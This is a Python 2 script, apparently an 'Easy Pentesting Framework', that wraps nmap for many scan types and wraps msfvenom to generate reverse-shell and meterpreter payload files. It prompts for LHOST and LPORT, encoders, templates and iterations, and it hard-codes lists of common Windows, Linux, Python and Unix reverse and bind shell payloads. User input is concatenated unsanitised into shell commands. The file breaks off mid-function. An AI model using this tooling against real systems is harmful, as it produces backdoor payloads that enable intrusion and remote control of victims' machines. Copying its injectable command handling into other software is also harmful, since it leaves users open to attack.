#!/usr/bin/python
import subprocess
import time, sys
import os
global wifi
global eth
global name

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner(name,length):
    print bcolors.HEADER+bcolors.BOLD+bcolors.FAIL+"*" * (length + 4)
    print "*"," "*len(name),"*"
    print "*", name, "*"
    print "*"," "*len(name),"*"
    print "*" * (length + 4) +bcolors.ENDC

def verifyhost(ipaddr):
	com=Command("ping -c 1 " + ipaddr).run()
	if com.error:
		return 1
	else:
		return 0

def basicscan(ipaddr):
	os.system('clear')
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Choose your scan type: "+bcolors.ENDC
	mychoice=raw_input("\n\n1) TCP Connect\n2) SYN Scan\n\n"+bcolors.HEADER + bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
	if (mychoice.isdigit()) and (len(mychoice) == 1):
		dict = {'1': '-sT', '2': '-sS'}
		com = Command("nmap "+ipaddr+" "+dict[mychoice]+" "+form+" "+filename).run()
		print com.output
		if com.error:
			print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: "+ com.error + bcolors.ENDC
	else:
		print bcolors.FAIL +bcolors.BOLD+ "\n[-] Error: Please note that multiple scans of this type cannot be performed simultaneously"+ bcolors.ENDC
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return

def advancedscan(ipaddr):
	os.system('clear')
	print bcolors.HEADER + bcolors.BOLD+"Choose your scan type: "+bcolors.ENDC
	dict = {'1': '-sF', '2': '-sN', '3': '-sX'}
	mychoice=raw_input("\n\n1) FIN Scan\n2) Null Scan\n3) Xmas Tree Scan\n\n"+bcolors.HEADER + bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
	if (mychoice.isdigit()) and (len(mychoice) == 1):
		com = Command("nmap "+ipaddr+" "+dict[mychoice]+" "+form+" "+filename).run()
		print com.output
		if com.error:
			print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: "+ com.error + bcolors.ENDC
	else:
		print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Please note that multiple scans of this type cannot be performed simultaneously"+  bcolors.ENDC
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
	
def pingscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sP "+form+" "+filename).run()
	print com.output
	if com.error:
		print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: "+ com.error + bcolors.ENDC
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def udpscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sU "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def protoscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sO "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def idlescan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sI "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def version(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sV "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def ackscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sA "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def windowscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sW "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def rpcscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sR "+form+" "+filename).run()
	print com.output
	print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def listscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -sL "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return
def osscan(ipaddr):
	os.system('clear')
	com = Command("nmap "+ipaddr+" -O "+form+" "+filename).run()
	print com.output
	if com.error:
		print "\n[-] Error: "+com.error
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return

def multiscan(ipaddr,parameter):
	os.system('clear')
	banner(name,length_name)	
	mystring = ""
	for i in parameter:
		mystring = mystring + i
	com = Command("nmap "+ipaddr+mystring+form+" "+filename).run()
	print com.output
	if com.error:
		print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: "+com.error + bcolors.ENDC
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+bcolors.ENDC)
	return



def nmapmain():
	os.system('clear')
	global name
	global length_name
	os.system('clear')
	name = "   E A S Y   P E N T E S T I N G   F R A M E W O R K   v 1 . 0   "
	length_name = len(name)
	banner(name,length_name)
	
	print bcolors.HEADER + bcolors.BOLD+"\n[+] Welcome to NMAP !\n"+  bcolors.ENDC
	ipaddr = raw_input("\n[*] Enter the host ip or host name (Eg: 192.168.0.1 or google.com): ")
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ...\n" +bcolors.ENDC
	while (verifyhost(ipaddr)):
		print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Invalid host or host seems down try pinging first !\n"+  bcolors.ENDC
		ipaddr = raw_input("\n[*] Enter the host ip or host name (Eg: 192.168.0.1 or google.com): ")
		
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Done ...\n" +bcolors.ENDC
	chc=raw_input("\n[*] Would you like to store the output in a file (Y/N): ")
	if chc == 'Y' or chc == 'y' or chc == 'Yes' or chc == 'yes':
		global form
		global formatfile
		global filename
		form = raw_input("\n[*] Enter the file format:  Output scan in normal(O) or XML(X) or Grepable (G): ")
		while form != 'O' and form != 'X' and form != 'G':
			form = raw_input("\n[*] Enter the file format:  Output scan in normal(O) or XML(X) or Grepable (G): ")
		dict = {'O':' -oO ','X':' -oX ','G':' -oG '}
		form = dict[form]
		filename=raw_input("\n[*] Enter the filename: ")
	else:
		form=""
		filename=""
	


	while True:
		os.system('clear')
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[*] Choose your scan type: "+ bcolors.ENDC
		mychoice=raw_input("\n1)  Basic Scanning\n2)  Advanced Scanning\n3)  Ping Scan\n4)  UDP Scan\n5)  IP Protocol Scan\n6)  Idle Scanning\n7)  Version detection\n8)  ACK Scan\n9)  Window Scan \n10) RPC Scan \n11) List Scan\n12) OS Fingerprinting\n13) Change host details\n14) Return to previous menu\n"+bcolors.HEADER + bcolors.BOLD+"\n[*] Choose your option (You can choose multiple options at once by using ',' as a delimiter: "+bcolors.ENDC)
		mylist=[]
		mylist = mychoice.split(',')
		if len(mylist)==1:
			choice = mylist[0]
			
			if int(choice) == 1:
				basicscan(ipaddr)
			elif int(choice) == 2:
				advancedscan(ipaddr)
			elif int(choice) ==3:
				pingscan(ipaddr)
			elif int(choice)==4:
				udpscan(ipaddr)
			elif int(choice) == 5:
				protoscan(ipaddr)
			elif int(choice) ==6:
				idlescan(ipaddr)
			elif int(choice)==7:
				version(ipaddr)		
			elif int(choice) == 8:
				ackscan(ipaddr)
			elif int(choice) ==9:
				windowscan(ipaddr)
			elif int(choice) == 10:
				rpcscan(ipaddr)
			elif int(choice) ==11:
				listscan(ipaddr)
			elif int(choice)==12:
				osscan(ipaddr)
			elif int(choice)==13:
				nmapmain()
			elif int(choice)==14:
				options()
			else:
				print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Invalid Input !"+  bcolors.ENDC
				
				
		if len(mylist)>1:
			global multi
			multi = []
			if '1' in mylist:
				mychoice=raw_input("\n\n1) TCP Connect\n2) SYN Scan\n\n"+bcolors.HEADER + bcolors.BOLD+"Choose your option: "+bcolors.ENDC) 
				dict = {'1': ' -sT ', '2': ' -sS '}
				multi.append(dict[mychoice])
			if '2' in mylist:
				dict = {'1': ' -sF ', '2': ' -sN ', '3': ' -sX '}
				mychoice=raw_input("\n\n1) FIN Scan\n2) Null Scan\n3) Xmas Tree Scan\n\n"+bcolors.HEADER + bcolors.BOLD+"Choose your option: "+bcolors.ENDC) 
				multi.append(dict[mychoice])
			if '3' in mylist:
				multi.append(' -sP ')
			if '4' in mylist:
				multi.append(' -sU ')
			if '5' in mylist:
				multi.append(' -sP ')
			if '6' in mylist:
				multi.append(' -sI ')
			if '7' in mylist:
				multi.append(' -sV ')
			if '8' in mylist:
				multi.append(' -sA ')
			if '9' in mylist:
				multi.append(' -sR ')
			if '10' in mylist:
				multi.append(' -sL ')
			if '11' in mylist:
				multi.append(' -sW ')
			if '12' in mylist:
				multi.append(' -O ')
			if '13' in mylist:
				print bcolors.FAIL + bcolors.BOLD+"\n[-] Error: Invalid Input !"+  bcolors.ENDC
				continue
			multiscan(ipaddr,multi)

def checkpath(path):

	com = Command("cd "+path).run()
	while com.error:
		print bcolors.FAIL + bcolors.BOLD+ "\n[-] Error: No such directory"+bcolors.ENDC
		path = raw_input(bcolors.HEADER+"\n[*] Please provide a valid path(Eg: '/root/Desktop/'): "+ bcolors.ENDC)
		com = Command("cd "+path).run()
	return path

#Function to get details of platforms

def platforms():

	os.system('clear')
	os.system('clear')
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ..." +bcolors.ENDC
	com = Command("msfvenom --help-platforms").run()
	mylist = com.error
	mylist=mylist.split('\n')
	mylist[1]=mylist[1].strip('\t')
	mynew = []
	os.system('clear')
	os.system('clear')
	mynew = mylist[1].split(',')
	for i in range(0,len(mynew)):
		if ' ' in mynew[i]:
			mynew[i]=mynew[i].strip()
	print bcolors.HEADER+ "Platforms available: "+bcolors.ENDC
	for i in range(0,len(mynew)):
		print str(i+1)+". "+mynew[i]
	choice = input(bcolors.HEADER + bcolors.BOLD+"\n[*] Select your platform(1 - "+str(len(mynew))+"): "+ bcolors.ENDC)
	for i in range(0,len(mynew)+1):
		if i == choice:
			pf=mynew[i-1]
	print bcolors.HEADER + bcolors.BOLD+"\nYour platform: "+pf+ bcolors.ENDC
	return pf

#Function to get details of NOPS

def nops():

	os.system('clear')
	os.system('clear')
	mylist = []
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ..." +bcolors.ENDC
	com = Command("msfvenom -l nops | cut -d \" \" -f 5").run()
	mylist = com.output
	os.system('clear')
	os.system('clear')
	print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC
	mylist = mylist.split('\n')
	print bcolors.HEADER +"NOPS available: "+ bcolors.ENDC
	for i in range(0,len(mylist)):
		if i>5:
			print str(i-5)+". "+mylist[i]
			if 'x86/single_byte' in mylist[i]:
				break
	choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your nop(1 - "+str(len(mylist)-8)+"): "+ bcolors.ENDC)
	for i in range(0,len(mylist)+1):
		if i-5 == choice:
			nop = mylist[i]
	print bcolors.HEADER + bcolors.BOLD+"\nYour nop: "+nop+ bcolors.ENDC
	return nop

#Function to get list of encoders

def encoders():

	os.system('clear')
	os.system('clear')
	mylist = []
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ..." +bcolors.ENDC
	com = Command("msfvenom -l encoders | cut -d \" \" -f 5").run()
	mylist = com.output
	os.system('clear')
	os.system('clear')
	print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC
	mylist = mylist.split('\n')
	print bcolors.HEADER + "Encoders available: " +bcolors.ENDC
	for i in range(0,len(mylist)+1):
		if i>5:
			print str(i-5)+". "+mylist[i]
			if 'x86/unicode_upper' in mylist[i]:
				break
	choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your encoder(1 - "+str(len(mylist)-8)+"): "+ bcolors.ENDC)
	for i in range(0,len(mylist)):
		if i-5 == choice:
			encoder = mylist[i]
	print bcolors.HEADER + bcolors.BOLD+"\n[+] Your encoder: "+encoder+ bcolors.ENDC
	return encoder
	
#Function to get formats

def myformat():

	os.system('clear')
	os.system('clear')
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ..." +bcolors.ENDC
	com = Command("msfvenom --help-formats").run()
	mylist = com.error
	os.system('clear')
	os.system('clear')
	mylist=mylist.split('\n')
	mylist[1]=mylist[1].strip('\t')
	mylist[3]=mylist[3].strip('\t')
	mynew = []
	mynew = mylist[1].split(',')
	mynew = mynew + mylist[3].split(',')
	for i in range(0,len(mynew)):
		if ' ' in mynew[i]:
			mynew[i]=mynew[i].strip()
			
	print bcolors.HEADER +"[*] Formats available: "+bcolors.ENDC
	for i in range(0,len(mynew)):
		print str(i+1)+". "+mynew[i]
	choice = input(bcolors.HEADER + bcolors.BOLD+"\n[*] Select your format(1 - "+str(len(mynew))+"): "+ bcolors.ENDC)
	for i in range(0,len(mynew)+1):
		if i == choice:
			myform = mynew[i-1]
	print bcolors.HEADER + bcolors.BOLD+"\n[+] Your format: "+ myform + bcolors.ENDC
	return myform
	
#function to initialise the various options in a payload

def actualpayload(payload):

	os.system('clear')
	os.system('clear')
	
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Payload creation: "+bcolors.ENDC
	inp = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed with payload: "+bcolors.ENDC+payload+bcolors.HEADER+" or press 'b' to select payload again: "+bcolors.ENDC)
	if inp == 'b' or inp =='B':
		createpayload()
	lhost = raw_input( bcolors.HEADER+"\n[*] Please provide the Local Host (LHOST): "+bcolors.ENDC)	
	lport = raw_input( bcolors.HEADER+"\n[*] Please provide the Local Host (LPORT): "+bcolors.ENDC)
	filename = raw_input( bcolors.HEADER+"\n[*] Please enter the name of the file with extension: "+bcolors.ENDC)
	path = raw_input(bcolors.HEADER+"\n[*] Please provide a path: "+bcolors.ENDC)
	path=checkpath(path)
	os.system('clear')
	os.system('clear')
	print bcolors.HEADER+bcolors.BOLD+ "\n[*] Your options till now:"+bcolors.ENDC+bcolors.HEADER+"\n\n[+] Payload: "+bcolors.ENDC+payload+bcolors.HEADER+"\n[+] LHOST: "+bcolors.ENDC+lhost+bcolors.HEADER+"\n[+] LPORT: "+bcolors.ENDC+lport+bcolors.HEADER+"\n[+] Filename: "+bcolors.ENDC+filename+bcolors.HEADER+"\n[+] Path: "+bcolors.ENDC+path+"\n" 
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to continue or 'b' to reset selected options: "+ bcolors.ENDC)
	if get == 'b' or get == 'B':
		actualpayload(payload)
	mychoice = raw_input( bcolors.HEADER+bcolors.BOLD+"\n[*] These are your payload options:"+bcolors.ENDC+" \n\n1) Encoders\n2) NOPS\n3) Formats\n4) Architecture\n5) Platform\n6) Iterations\n7) Template\n\n[*] Please select one or more options using ',' as a delimiter: ")
	command="msfvenom -p "+payload+" LHOST="+lhost+" LPORT="+lport
	mylist=[]
	mylist = mychoice.split(',')
	if '1' in mylist:
		encoder=encoders()
		encoder = ' -e '+encoder
		command = command + encoder
	if '2' in mylist:
		nop=nops()
		nop = ' -n '+nop
		command = command + nop
	if '3' in mylist:
		formats=myformat()
		formats = ' -f '+formats
		command = command +formats
	if '4' in mylist:
		os.system("clear")
		os.system('clear')
		architecture = raw_input(bcolors.HEADER+"\n[*] Enter the target architecture (x64/x86): "+bcolors.ENDC)
		architecture = " -a "+architecture
		command = command +architecture
	if '5' in mylist:
		platform=platforms()
		platform = " --platform  "+platform
		command = command +platform
	if '6' in mylist:
		os.system("clear")
		os.system('clear')
		iterations =  raw_input(bcolors.HEADER+"\n[*] Enter the number of iterations (1-200): "+bcolors.ENDC)
		iterations = " -i "+iterations
		command = command +iterations
	if '7' in mylist:
		os.system("clear")
		os.system('clear')
		template =  raw_input(bcolors.HEADER+"\n[*] Enter the name of the template: "+bcolors.ENDC)
		template = " -x "+template
		command = command + template
	if path != "":
		if path[len(path)-1] == '/':
			command = command+ ' -o '+path+filename
		else: 	
			command = command+ ' -o '+path+"/"+filename
	else:
		command = command + ' -o '+filename
	os.system("clear")
	os.system('clear')	
	print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ..." +bcolors.ENDC
	com = Command(command).run()
	os.system("clear")
	os.system('clear')
	print bcolors.FAIL + bcolors.BOLD+"\n[*] "+com.error+bcolors.ENDC
	
	opt = raw_input(bcolors.HEADER+"\n\n[*] Press any key to return or press 'b' to register payload options: "+ bcolors.ENDC)
	if opt == 'b' or opt == 'B':
		actualpayload(payload)
	return

#function to get name of payload
	
def createpayload():
		
	while 1:
		os.system('clear')
		os.system('clear')
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[+] Select your option.... "+ bcolors.ENDC
		mychoice=raw_input("\n1) List all payloads\n2) List payloads by keyword (Eg: windows, python, linux)\n3) List most common payloads\n4) Return to previous menu\n\n"+bcolors.HEADER+bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
		
		if mychoice == '1':
			mylist = []
			print bcolors.HEADER + bcolors.BOLD+"\n\n[*] Please Wait ...\n" +bcolors.ENDC
			com = Command("msfvenom -l payloads | cut -d \" \" -f 5").run()
			mylist = com.output
			print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC
			mylist = mylist.split('\n')
			for i in range(0,len(mylist)):
				if i > 5:
					print str(i-5)+". "+mylist[i]
					if 'windows/x64/vncinject/reverse_winhttps' in mylist[i]:
						break
			choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(mylist)-8)+"): "+ bcolors.ENDC)
			for i in range(0,len(mylist)):
				if i-5 == choice:
					payload = mylist[i]
			print bcolors.HEADER + bcolors.BOLD+"\nYour payload: "+bcolors.ENDC+payload
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
				continue
			else:
				break
			
		
		elif mychoice == '2':
			keyword=raw_input(bcolors.HEADER+"\n[*] Enter keyword: "+bcolors.ENDC)
			print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ...\n" +bcolors.ENDC
			com = Command("msfvenom -l payloads | grep "+keyword+" | cut -d \" \" -f 5").run()
			mylist = com.output
			if mylist == "":
				
				print bcolors.FAIL + bcolors.BOLD+ "\n[-] Error: Wrong keyword" + bcolors.ENDC
				get = raw_input(bcolors.HEADER+"\n[*] Press any key to reset ... "+ bcolors.ENDC)
				continue
			if com.error:

				print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC	
				get = raw_input(bcolors.HEADER+"\n[*] Press any key to reset ... "+ bcolors.ENDC)
				continue
			mylist = mylist.split('\n')
			for i in range(1,len(mylist)):
				print  str(i)+". "+mylist[i-1]
		
			choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(mylist)-1)+"): "+ bcolors.ENDC)
			for i in range(1,len(mylist)):
				if i == choice:
					payload = mylist[i-1]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Your payload: "+bcolors.ENDC+payload			
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
				continue
			else:
				break
		elif mychoice == '3':
			payloadlist = [ ['windows/meterpreter/reverse_tcp','windows/shell/bind_tcp','windows/shell/reverse_tcp','windows/shell_bind_tcp','windows/shell_reverse_tcp','windows/x64/meterpreter/bind_tcp','windows/x64/meterpreter/bind_tcp_uuid','windows/x64/meterpreter/reverse_http','windows/x64/meterpreter/reverse_https','windows/x64/meterpreter/reverse_tcp','windows/x64/meterpreter/reverse_tcp_uuid','windows/x64/meterpreter_bind_tcp','windows/x64/meterpreter_reverse_http','windows/x64/meterpreter_reverse_https','windows/x64/meterpreter_reverse_tcp','windows/x64/powershell_bind_tcp','windows/x64/powershell_reverse_tcp','windows/x64/shell/bind_ipv6_tcp','windows/x64/shell/bind_ipv6_tcp_uuid','windows/x64/shell/bind_tcp','windows/x64/shell/bind_tcp_uuid','windows/x64/shell/reverse_tcp','windows/x64/shell/reverse_tcp_uuid','windows/x64/shell_bind_tcp','windows/x64/shell_reverse_tcp','windows/meterpreter/bind_tcp','windows/meterpreter/reverse_http','windows/meterpreter/reverse_https','windows/meterpreter_reverse_http','windows/meterpreter_reverse_https','windows/meterpreter_reverse_tcp','cmd/windows/generic','cmd/windows/powershell_bind_tcp','cmd/windows/powershell_reverse_tcp','cmd/windows/reverse_powershell'],['python/meterpreter/bind_tcp','python/meterpreter/reverse_http','python/meterpreter/reverse_https','python/meterpreter/reverse_tcp','python/meterpreter/reverse_tcp_ssl','python/meterpreter_bind_tcp','python/meterpreter_reverse_http','python/meterpreter_reverse_https','python/meterpreter_reverse_tcp'],['linux/x64/meterpreter/bind_tcp','linux/x64/meterpreter/reverse_tcp','linux/x64/meterpreter_reverse_http','linux/x64/meterpreter_reverse_https','linux/x64/meterpreter_reverse_tcp','linux/x64/shell/bind_tcp','linux/x64/shell/reverse_tcp','linux/x64/shell_bind_tcp','linux/x64/shell_find_port','linux/x64/shell_reverse_tcp' ],['cmd/unix/bind_netcat','cmd/unix/bind_nodejs','cmd/unix/bind_perl','cmd/unix/generic','cmd/unix/interact','cmd/unix/reverse','cmd/unix/reverse_bash','cmd/unix/reverse_bash_telnet_ssl','cmd/unix/reverse_ncat_ssl','cmd/unix/reverse_netcat','cmd/unix/reverse_nodejs','cmd/unix/reverse_openssl','cmd/unix/reverse_perl','cmd/unix/reverse_perl_ssl','cmd/unix/reverse_php_ssl','cmd/unix/reverse_python','cmd/unix/reverse_python_ssl']]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Select the platform ... "+ bcolors.ENDC
			choice=raw_input("\n1) Windows\n2) Python\n3) Linux\n4) Unix\n\n"+bcolors.HEADER+bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
			plat = ['Windows','Python','Linux','Unix']
			print bcolors.HEADER+"\n[*]Platform: "+plat[int(choice)-1]+"\n"+bcolors.ENDC
			for i in range (1,len(payloadlist[int(choice)-1])):
				print str(i)+". "+ payloadlist[int(choice)-1][i]
			chc = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(payloadlist[int(choice)-1])-1)+"): "+ bcolors.ENDC)
			for i in range(0,len(payloadlist[int(choice)-1])):
				if i == chc:
					payload = payloadlist[int(choice)-1][i]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Your payload: "+bcolors.ENDC+payload	
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
				continue
			else:
				break
		
			get = raw_input(bcolors.HEADER+"\nPress any key to return..."+ bcolors.ENDC)

		elif mychoice == '4':
			metamain()

	actualpayload(payload)
	get = raw_input(bcolors.HEADER+"\n[*] Press any key to return..."+ bcolors.ENDC)
	return

def payload_listener():
	while 1:
		os.system('clear')
		os.system('clear')
		banner(name,length_name)
		print bcolors.HEADER + bcolors.BOLD+"\n[+] Select your option.... "+ bcolors.ENDC
		mychoice=raw_input("\n1) List all payloads\n2) List payloads by keyword (Eg: windows, python, linux)\n3) List most common payloads\n4) Return to previous menu\n\n"+bcolors.HEADER+bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
		
		if mychoice == '1':
			mylist = []
			print bcolors.HEADER + bcolors.BOLD+"\n\n[*] Please Wait ...\n" +bcolors.ENDC
			com = Command("msfvenom -l payloads | cut -d \" \" -f 5").run()
			mylist = com.output
			print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC
			mylist = mylist.split('\n')
			for i in range(0,len(mylist)):
				if i > 5:
					print str(i-5)+". "+mylist[i]
					if 'windows/x64/vncinject/reverse_winhttps' in mylist[i]:
						break
			choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(mylist)-8)+"): "+ bcolors.ENDC)
			for i in range(0,len(mylist)):
				if i-5 == choice:
					payload = mylist[i]
			print bcolors.HEADER + bcolors.BOLD+"\nYour payload: "+bcolors.ENDC+payload
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
				continue
			else:
				break
			
		
		elif mychoice == '2':
			keyword=raw_input(bcolors.HEADER+"\n[*] Enter keyword: "+bcolors.ENDC)
			print bcolors.HEADER + bcolors.BOLD+"\n[*] Please Wait ...\n" +bcolors.ENDC
			com = Command("msfvenom -l payloads | grep "+keyword+" | cut -d \" \" -f 5").run()
			mylist = com.output
			if mylist == "":
				
				print bcolors.FAIL + bcolors.BOLD+ "\n[-] Error: Wrong keyword" + bcolors.ENDC
				get = raw_input(bcolors.HEADER+"\n[*] Press any key to reset ... "+ bcolors.ENDC)
				continue
			if com.error:

				print bcolors.FAIL + bcolors.BOLD+ com.error + bcolors.ENDC	
				get = raw_input(bcolors.HEADER+"\n[*] Press any key to reset ... "+ bcolors.ENDC)
				continue
			mylist = mylist.split('\n')
			for i in range(1,len(mylist)):
				print  str(i)+". "+mylist[i-1]
		
			choice = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(mylist)-1)+"): "+ bcolors.ENDC)
			for i in range(1,len(mylist)):
				if i == choice:
					payload = mylist[i-1]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Your payload: "+bcolors.ENDC+payload			
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
				continue
			else:
				break
		elif mychoice == '3':
			payloadlist = [ ['windows/meterpreter/reverse_tcp','windows/shell/bind_tcp','windows/shell/reverse_tcp','windows/shell_bind_tcp','windows/shell_reverse_tcp','windows/x64/meterpreter/bind_tcp','windows/x64/meterpreter/bind_tcp_uuid','windows/x64/meterpreter/reverse_http','windows/x64/meterpreter/reverse_https','windows/x64/meterpreter/reverse_tcp','windows/x64/meterpreter/reverse_tcp_uuid','windows/x64/meterpreter_bind_tcp','windows/x64/meterpreter_reverse_http','windows/x64/meterpreter_reverse_https','windows/x64/meterpreter_reverse_tcp','windows/x64/powershell_bind_tcp','windows/x64/powershell_reverse_tcp','windows/x64/shell/bind_ipv6_tcp','windows/x64/shell/bind_ipv6_tcp_uuid','windows/x64/shell/bind_tcp','windows/x64/shell/bind_tcp_uuid','windows/x64/shell/reverse_tcp','windows/x64/shell/reverse_tcp_uuid','windows/x64/shell_bind_tcp','windows/x64/shell_reverse_tcp','windows/meterpreter/bind_tcp','windows/meterpreter/reverse_http','windows/meterpreter/reverse_https','windows/meterpreter_reverse_http','windows/meterpreter_reverse_https','windows/meterpreter_reverse_tcp','cmd/windows/generic','cmd/windows/powershell_bind_tcp','cmd/windows/powershell_reverse_tcp','cmd/windows/reverse_powershell'],['python/meterpreter/bind_tcp','python/meterpreter/reverse_http','python/meterpreter/reverse_https','python/meterpreter/reverse_tcp','python/meterpreter/reverse_tcp_ssl','python/meterpreter_bind_tcp','python/meterpreter_reverse_http','python/meterpreter_reverse_https','python/meterpreter_reverse_tcp'],['linux/x64/meterpreter/bind_tcp','linux/x64/meterpreter/reverse_tcp','linux/x64/meterpreter_reverse_http','linux/x64/meterpreter_reverse_https','linux/x64/meterpreter_reverse_tcp','linux/x64/shell/bind_tcp','linux/x64/shell/reverse_tcp','linux/x64/shell_bind_tcp','linux/x64/shell_find_port','linux/x64/shell_reverse_tcp' ],['cmd/unix/bind_netcat','cmd/unix/bind_nodejs','cmd/unix/bind_perl','cmd/unix/generic','cmd/unix/interact','cmd/unix/reverse','cmd/unix/reverse_bash','cmd/unix/reverse_bash_telnet_ssl','cmd/unix/reverse_ncat_ssl','cmd/unix/reverse_netcat','cmd/unix/reverse_nodejs','cmd/unix/reverse_openssl','cmd/unix/reverse_perl','cmd/unix/reverse_perl_ssl','cmd/unix/reverse_php_ssl','cmd/unix/reverse_python','cmd/unix/reverse_python_ssl']]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Select the platform ... "+ bcolors.ENDC
			choice=raw_input("\n1) Windows\n2) Python\n3) Linux\n4) Unix\n\n"+bcolors.HEADER+bcolors.BOLD+"[*] Choose one option: "+bcolors.ENDC) 
			plat = ['Windows','Python','Linux','Unix']
			print bcolors.HEADER+"\n[*]Platform: "+plat[int(choice)-1]+"\n"+bcolors.ENDC
			for i in range (1,len(payloadlist[int(choice)-1])):
				print str(i)+". "+ payloadlist[int(choice)-1][i]
			chc = input(bcolors.HEADER + bcolors.BOLD+"\n\n[*] Select your payload(1 - "+str(len(payloadlist[int(choice)-1])-1)+"): "+ bcolors.ENDC)
			for i in range(0,len(payloadlist[int(choice)-1])):
				if i == chc:
					payload = payloadlist[int(choice)-1][i]
			print bcolors.HEADER + bcolors.BOLD+"\n[+] Your payload: "+bcolors.ENDC+payload	
			get = raw_input(bcolors.HEADER+"\n[*] Press any key to proceed or 'b' to reselect payload: "+ bcolors.ENDC)
			if get == 'b' or get == 'B':
